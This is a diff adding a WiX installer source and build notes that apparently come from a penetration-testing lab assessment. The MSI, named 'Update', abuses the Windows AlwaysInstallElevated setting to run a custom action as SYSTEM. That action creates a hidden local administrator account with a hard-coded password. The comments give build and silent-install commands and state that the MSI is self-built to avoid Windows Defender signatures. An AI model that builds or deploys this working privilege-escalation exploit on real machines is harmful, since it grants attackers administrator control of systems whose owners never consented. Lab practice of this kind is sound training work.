@@ -1,0 +1,37 @@
+<?xml version="1.0"?>
+<!--
+  adduser.wxs - AlwaysInstallElevated abuse (Stage 6 / Keys of the Gods)
+
+  ISOLATED LAB ONLY. Authorised TAFE Cert IV assessment. Host-only network.
+
+  Clean, self-built MSI (NOT msfvenom) so Windows Defender has no signature to
+  match. Under AlwaysInstallElevated (HKLM+HKCU both = 1), msiexec runs the
+  deferred / no-impersonate custom action in the SYSTEM context -> net user as SYSTEM.
+
+  BUILD (on Kali, needs msitools):
+      wixl -o evil.msi adduser.wxs
+
+  RUN (on persephone-ws, as persephone, from LOCAL DISK - never \\tsclient,
+       SYSTEM cannot read the per-session RDP redirect -> error 1619):
+      copy \\tsclient\tools\evil.msi C:\Users\persephone\Downloads\evil.msi
+      msiexec /quiet /qn /i C:\Users\persephone\Downloads\evil.msi
+      net localgroup administrators     :: verify (ignore any msiexec rollback error)
+
+  Change USER / PASS below; keep 3-of-4 complexity and short strings.
+-->
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="Update" Language="1033" Version="1.0.0.0"
+           Manufacturer="x" UpgradeCode="12345678-1234-1234-1234-1234567890AB">
+    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
+    <Directory Id="TARGETDIR" Name="SourceDir"/>
+    <Feature Id="F" Level="1"/>
+
+    <CustomAction Id="Pwn" Execute="deferred" Impersonate="no" Return="ignore"
+      Directory="TARGETDIR"
+      ExeCommand='cmd.exe /c net user hades2 P3rseph0ne!26 /add &amp;&amp; net localgroup administrators hades2 /add'/>
+
+    <InstallExecuteSequence>
+      <Custom Action="Pwn" After="InstallInitialize"/>
+    </InstallExecuteSequence>
+  </Product>
+</Wix>
